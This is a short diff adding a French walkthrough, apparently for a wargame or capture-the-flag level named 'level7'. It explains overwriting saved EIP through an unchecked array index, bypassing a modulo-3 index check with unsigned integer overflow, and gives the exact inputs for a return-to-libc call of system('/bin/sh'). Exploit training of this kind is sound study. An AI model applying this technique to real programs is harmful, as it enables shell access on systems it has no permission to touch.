@@ -1,1 +1,35 @@
-toto
+Le programme store des nombres, mais il ne check pas grand chose (ce fdp)
+
+On peut donc reecrire la stack.
+
+On recupere donc l'addresse du tableau alloue par le programme (0xffffd534) et l'addresse de la save de $eip du main (0xffffd6fc) (grace a info frame).
+=> On recupere l'offset a reecrire : 456.
+
+Le tableau contient des ints, et cet offset doit etre divise par 4, on obtient 114.
+Le programme dispose d'une protection contre les indexs qui !(idx % 3) renvoie une erreur. 114 % 3 = 0, on est dans la merde.
+
+Cependant le scanf qui recupere l'index attend un unsigned int, on peut le faire overflow pour recuperer 114.
+Grace a cette formule magique on peut tester differentes possibilites en recuperant tous les x tels que:
+
+((x + 114) * 4) % 2**32 = 456
+
+x = 2**32 / 2 | 2**32 / 4 | 2**32 / 2 + 2**32 / 4
+   2147483648 | 1073741824 |  3221225472
+
+Avec l'index qui va overflow, il nous suffit maintenant d'ecrire l'addresse de system sur la sauvegarde d'eip. (0xf7e6aed0 => 4159090384)
+Il nous suffira ensuite d'envoyer l'addresse de "/bin/sh" 2 bytes plus loin. (0xf7f897ec => 4160264172)
+
+La solution d'index prise est la seconde car c'est la seule qui permet d'ecrire a x+2 sans que !(x+2 % 3).
+
+Recap avec x = 2147483648:
+./level7
+
+store
+4159090384                     => &system
+2147483762 (x + 114)
+
+store
+4160264172                     => &"/bin/sh"
+2147483764 (x + 114 + 2)
+
+quit
